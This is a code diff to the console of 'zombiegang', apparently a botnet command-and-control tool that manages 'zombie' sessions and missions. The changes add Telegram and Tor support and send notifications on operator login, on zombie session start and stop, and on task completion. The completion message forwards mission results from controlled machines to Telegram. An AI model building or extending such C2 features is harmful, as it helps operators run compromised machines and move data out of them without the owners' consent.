@@ -40,7 +40,13 @@ class ZgangConsole(cmd.Cmd):
         self.COLOR_PROMPT_TAG_PREFIX = color.GREY
 
         self.prompt = '{}zgang{} {}>{} '.format(self.COLOR_PROMPT_TAG, color.END, self.COLOR_PROMPT,color.END)
-        self.intro = "{}zombiegang 0.5.1~beta 2022 console{}".format(self.COLOR_WELCOME_BANNER, color.END)
+        self.intro = "{}zombiegang 1.0.0 CLI - Ubuntu VPS Edition with Telegram & Tor v3 support{}".format(self.COLOR_WELCOME_BANNER, color.END)
+        
+        # Check Telegram status
+        if telegram.enabled:
+            logger.log('Telegram notifications enabled', 'SUCCESS')
+        else:
+            logger.log('Telegram notifications disabled (configure TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)', 'WARNING')
         self.ruler = '-'
 
         self.doc_header = 'commands'
@@ -341,6 +347,8 @@ class ZgangConsole(cmd.Cmd):
                 if zession.login(zession.username, zession.password, zession.remote_host):
                     logger.log('logged as {} at {}'.format(zession.username, zession.remote_host), 'SUCCESS')
                     self.env_vars['SESSION'] = ''
+                    # Send Telegram notification
+                    telegram.notify_login(zession.username, zession.remote_host)
                 else:
                     logger.log('error trying to log into {}'.format(zession.remote_host), 'ERROR')
             else:
@@ -409,6 +417,11 @@ class ZgangConsole(cmd.Cmd):
                                     sleep(secs_to_wait)
                                     print('')  # line break
                                     logger.log('session for zombie {} {}'.format(zombie_id, action), 'SUCCESS')
+                                    # Send Telegram notification for session start
+                                    if action == 'started':
+                                        telegram.notify_session_started(mission.zombie_username, zombie_id)
+                                    else:
+                                        telegram.notify_session_stopped(mission.zombie_username, zombie_id)
                                 #print(self.prompt)
 
                         # show result for other task_types
@@ -418,6 +431,9 @@ class ZgangConsole(cmd.Cmd):
                             if mission.result is not None:
                                 print('')  # line break
                                 logger.log('[{}]\r\n{}'.format(self.env_vars['SESSION'], mission.result), 'INFO')
+                                # Send Telegram notification for task completion
+                                task_name = r[0].get('task_name', 'Unknown')
+                                telegram.notify_task_completed(task_name, mission.zombie_username, mission.result)
 
                     self.executed_missions.task_done()
 
